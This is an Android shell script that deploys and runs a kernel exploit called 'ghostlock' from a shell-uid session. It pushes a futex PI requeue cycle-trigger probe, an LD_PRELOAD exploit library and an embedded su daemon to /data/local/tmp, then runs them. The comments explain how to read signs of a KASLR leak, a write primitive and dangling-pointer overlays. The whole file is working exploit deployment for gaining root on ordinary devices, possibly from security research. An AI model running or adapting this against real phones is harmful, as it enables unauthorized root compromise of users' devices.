#!/system/bin/sh
# deploy_test.sh - deploy the fixed exploit + cycle_probe to the device and run.
#
# Run from rish / Shizuku shell (uid 2000), NOT from untrusted_app Termux.
#   Usage:  sh deploy_test.sh [cycle|exploit|both]
#
# The preload.so (88KB) is pushed via base64 stdin forwarding (the memory note:
# rish copying >80KB over the connect channel can time out; base64-on-stdin
# avoids the burst).  cycle_probe is tiny and copied the same way.
set -u

DST=/data/local/tmp/ghostlock-test
MODE=${1:-both}

base64_push() {
  # $1 = local file, $2 = remote path
  local b64
  b64=$(base64 < "$1") || { echo "base64 encode failed: $1"; return 1; }
  echo "$b64" | base64 -d > "$2" 2>/dev/null
  chmod 755 "$2" 2>/dev/null
  echo "pushed $1 -> $2 ($(wc -c < "$2") bytes)"
}

echo "[deploy] mode=$MODE DST=$DST"
mkdir -p "$DST"

# Decisive KASLR/QOS context check (readable by shell, not untrusted_app).
echo "[ctx] hw_futex_pi_enabled=$(cat /proc/sys/kernel/hw_futex_pi_enabled 2>&1)"
echo "[ctx] own cpuset: $(cat /proc/self/cpuset 2>&1)"

if [ "$MODE" = "cycle" ] || [ "$MODE" = "both" ]; then
  echo "[deploy] pushing cycle_probe..."
  # The caller runs this file FROM the repo dir; cycle_probe source is at
  # ./tools/cycle_probe.c (rebuild if the binary is absent in a fresh clone).
  if [ ! -x tools/cycle_probe ]; then
    echo "[deploy] building tools/cycle_probe from source"
    cc -O2 -Wall tools/cycle_probe.c -o tools/cycle_probe || { echo "build failed"; exit 1; }
  fi
  base64_push tools/cycle_probe "$DST/cycle_probe" || true
  echo "[run] cycle_probe (cheap EDEADLK-cycle trigger validator)"
  "$DST/cycle_probe" > "$DST/cycle_probe.log" 2>&1
  rc=$?
  echo "[run] cycle_probe exit=$rc"
  cat "$DST/cycle_probe.log" 2>/dev/null
  echo "  -> 'CMP_REQUEUE_PI ... (EDEADLK!)' means the cycle trigger forms."
  echo "  -> 'ret=1' means the requeue SUCCEEDED (no dangling) - check hw_futex_pi_enabled / cpuset above."
fi

if [ "$MODE" = "exploit" ] || [ "$MODE" = "both" ]; then
  echo "[deploy] pushing preload.so + su_daemon..."
  base64_push exploit/ghostlock-source/build/bin/preload.so "$DST/preload.so" || true
  base64_push exploit/ghostlock-source/build/embed/su_daemon_aarch64_pie "$DST/su_daemon_aarch64_pie" || true

  echo "[run] full exploit (LD_PRELOAD) - watch for slide-kaslr-ok or a consumer oops"
  rm -f "$DST/exploit.log"
  (
    cd "$DST" || exit 1
    LD_PRELOAD="$DST/preload.so" /system/bin/sh -c 'exit 0'
  ) > "$DST/exploit.log" 2>&1
  echo "EXIT=$?" >> "$DST/exploit.log"
  echo "[run] exploit done; tail of log:"
  tail -40 "$DST/exploit.log"
  echo "  -> 'slide-kaslr-ok ... stext=...' = the write primitive fired (boot_id leaked)."
  echo "  -> a consumer oops in the log = dangling ptr + overlay both land (good sign)."
  echo "  -> boot_id unchanged + clean sched_setattr = trigger still not forming (report)."
fi
echo "[deploy] done"
